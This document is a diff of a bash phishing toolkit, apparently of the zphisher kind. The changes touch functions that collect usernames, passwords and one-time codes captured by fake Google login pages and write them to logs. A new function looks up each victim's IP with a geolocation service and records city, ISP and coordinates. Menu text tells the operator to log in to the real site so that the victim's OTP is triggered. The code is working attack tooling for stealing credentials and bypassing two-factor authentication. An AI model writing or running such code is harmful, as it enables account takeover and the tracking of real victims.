-capture_id() {
-	echo "${RED}"
-        cat .server/www/usernames.txt
-	echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
-	cat .server/dumps/space.txt >> "logs/${log_name}.txt"
-        cat .server/www/usernames.txt >> "logs/${log_name}.txt"
-	rm -rf .server/www/usernames.txt
-}
-
-## Get credentials
-capture_pass() {
-	echo "${RED}"
-	cat  .server/www/pass.txt
-	echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
-	cat .server/dumps/space.txt >> logs/${log_name}.txt
-        cat .server/www/pass.txt >> logs/${log_name}.txt
-	rm -rf .server/www/pass.txt
-
-}
-
-## Get otp
-capture_otp() {
-	echo "${RED}"
-        cat  .server/www/otp.txt
-	echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
-	cat .server/dumps/space.txt >> logs/${log_name}.txt
-        cat .server/www/otp.txt >> logs/${log_name}.txt
-	rm -rf .server/www/otp.txt
 }
 
 ## Print data no otp
@@ -748,7 +739,6 @@ capture_data_1() {
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !"
                         capture_id
 			capture_pass
-			rm -rf .server/www/pass.txt
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
                 fi
                 sleep 0.75
@@ -768,12 +758,11 @@ capture_data_2() {
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
                         capture_id
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for OTP>"
-			echo -ne "\n${WHITE} NOTE : OTP WON'T BE SENT AUTOMATICALLY, ONCE YOU LOGIN IN OFFICAL WEBSITE, THAT OTP WILL BE SENT TO VICTIM"
+			echo -ne "\n${WHITE} NOTE : OTP will only be sent to victim when you login to offical website"
                 fi
 		if [[ -e ".server/www/otp.txt" ]]; then
-			echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} OTP Found !"
+			echo -ne "\n\n${GREEN} OTP Found !"
                         capture_otp
-                        rm -rf .server/www/otp.txt
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
                 fi
                 sleep 0.75
@@ -795,15 +784,132 @@ capture_data_3() {
 			capture_pass
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for OTP>"
                         echo -ne "\n${WHITE} NOTE : OTP WON'T BE SENT AUTOMATICALLY, ONCE YOU LOGIN IN OFFICAL WEBSITE, THAT OTP WILL BE SENT TO VICTIM"
-			rm -rf .server/www/pass.txt
                 fi
 		if [[ -e ".server/www/otp.txt" ]]; then
-			echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} OTP Found !"
+			echo -ne "\n\n${GREEN} OTP Found !"
 			capture_otp
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 		fi
                 sleep 0.75
 	done
+}
+
+## Get IP address
+capture_ip() {
+##      IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+	IP=$(awk -F 'IP: ' '{print $2}' .server/www/ip.txt | xargs)
+	echo "${MAGENTABG}${CYAN}"
+        echo -e " Victim's IP : $IP ${RESETBG}"
+	echo "${RESETBG}${NC}"
+	if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
+		echo -ne "${RED} IP details cannot be captured in localhost server"
+		echo " "
+		save_ip
+	else
+		ip_details $IP
+		save_ip
+	fi
+}
+save_ip() {
+	cat .server/dumps/space.txt >> ${log_name}.txt
+	cat .server/dumps/line.txt >> ${log_name}.txt
+	cat .server/www/ip.txt >> ${log_name}.txt
+	mv ${log_name}.txt logs
+	echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} /logs/${log_name}.txt"
+	rm -rf .server/www/ip.txt
+}
+ip_details() {
+	IP=$1
+	curl -s -L "http://ipwhois.app/json/$IP" > rawtrack.txt
+	grep -o '"[^"]*"\s*:\s*[^,]*' rawtrack.txt > track.txt
+	iptt=$(sed -n 's/"ip"://p' track.txt)
+	if [[ $iptt != "" ]]; then
+		echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
+	fi
+	iptype=$(sed -n 's/"type"://p' track.txt)
+	if [[ $iptype != "" ]]; then
+		echo -e "${GREEN} IP type: ${NC} $iptype"
+	fi
+	latitude=$(sed -n 's/"latitude"://p' track.txt)
+	if [[ $latitude != "" ]]; then
+		echo -e  "${GREEN} Latitude:  ${NC} $latitude"
+	fi
+	longitude=$(sed -n 's/"longitude"://p' track.txt)
+	if [[ $longitude != "" ]]; then
+		echo -e  "${GREEN} Longitude:  ${NC} $longitude"
+	fi
+	city=$(sed -n 's/"city"://p' track.txt)
+	if [[ $city != "" ]]; then
+		echo -e "${GREEN} City: ${NC} $city"
+	fi
+	isp=$(sed -n 's/"isp"://p' track.txt)
+	if [[ $isp != "" ]]; then
+		echo -e "${GREEN} Isp: ${NC} $isp"
+	fi
+	country=$(sed -n 's/"country"://p' track.txt)
+	if [[ $country != "" ]]; then
+		echo -e  "${GREEN} Country: ${NC} $country"
+	fi
+	flag=$(sed -n 's/"country_flag"://p' track.txt)
+	if [[ $flag != "" ]]; then
+		echo -e "${GREEN} Country flag: ${NC} $flag"
+	fi
+	cap=$(sed -n 's/"country_capital"://p' track.txt)
+	if [[ $cap != "" ]]; then
+		echo -e "${GREEN} Country capital: ${NC} $cap"
+	fi
+	phon=$(sed -n 's/"country_phone"://p' track.txt)
+	if [[ $phon != "" ]]; then
+		echo -e "${GREEN} Country code: ${NC} $phon"
+	fi
+	continent=$(sed -n 's/"continent"://p' track.txt)
+	if [[ $continent != "" ]]; then
+		echo -e  "${GREEN} Continent:  ${NC} $continent"
+	fi
+	ccode=$(sed -n 's/"currency_code"://p' track.txt)
+	if [[ $ccode != "" ]]; then
+		echo -e "${GREEN} Currency code: ${NC} $ccode"
+	fi
+	region=$(sed -n 's/"region"://p' track.txt)
+	if [[ $region != "" ]]; then
+		echo -e "${GREEN} State: ${NC} $region"
+	fi
+	cat track.txt >> "${log_name}.txt"
+	rm -rf track.txt
+	rm -rf rawtrack.txt
+}
+
+## Get credentials
+capture_id() {
+	echo "${MAGENTABG}${CYAN}"
+        cat .server/www/usernames.txt
+	echo "${RESETBG}${NC}"
+        echo -e "${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+	cat .server/dumps/space.txt >> "logs/${log_name}.txt"
+        cat .server/www/usernames.txt >> "logs/${log_name}.txt"
+	rm -rf .server/www/usernames.txt
+}
+
+## Get credentials
+capture_pass() {
+	echo "${MAGENTABG}${CYAN}"
+	cat  .server/www/pass.txt
+	echo "${RESETBG}${NC}"
+        echo -e "${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+	cat .server/dumps/space.txt >> logs/${log_name}.txt
+        cat .server/www/pass.txt >> logs/${log_name}.txt
+	rm -rf .server/www/pass.txt
+}
+
+## Get otp
+capture_otp() {
+	echo "${MAGENTABG}${CYAN}"
+        cat  .server/www/otp.txt
+	echo "${RESETBG}${NC}"
+        echo -e "${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+	cat .server/dumps/space.txt >> logs/${log_name}.txt
+        cat .server/www/otp.txt >> logs/${log_name}.txt
+	rm -rf .server/www/otp.txt
 }
 
 #online or offline stats
@@ -1515,39 +1621,33 @@ esac
 }
 #google
 site_google(){
-echo -e "${BLUE}[01]${CYAN} Google new - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} Google new - WITH OTP ${NC}"
+echo -e "${BLUE}[01]${CYAN} Google - WITHOUT OTP ${NC}"
+echo -e "${BLUE}[02]${CYAN} Google - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Google Poll - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Google Poll - WITH OTP ${NC}"
-echo -e "${BLUE}[05]${CYAN} Google old- WITHOUT OTP ${NC}"
-echo -e "${BLUE}[06]${CYAN} Google old- WITH OTP ${NC}"
+echo -e "${BLUE}[05]${CYAN} Google old - WITHOUT OTP ${NC}"
+echo -e "${BLUE}[06]${CYAN} Google old - WITH OTP ${NC}"
 echo -e " ${NC}"
 read -p "${MAGENTA} YOUR CHOICE : " choice
 
 case $choice in
         1 | 01)
-                website="google_new"
-		zipname="google_new"
+                website="google"
                 tunnelmenu;;
         2 | 02)
-                website="google_new/otp"
-		zipname="google_new"
+                website="google/otp"
                 tunnelmenu;;
         3 | 03)
                 website="google_poll"
-		zipname="google_poll"
                 tunnelmenu;;
         4 | 04)
                 website="google_poll/otp"
-		zipname="google_poll"
                 tunnelmenu;;
         5 | 05)
-                website="google"
-		zipname="google"
+                website="google_old"
                 tunnelmenu;;
 	6 | 06)
-		website="google/otp"
-		zipname="google"
+		website="google_old/otp"
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
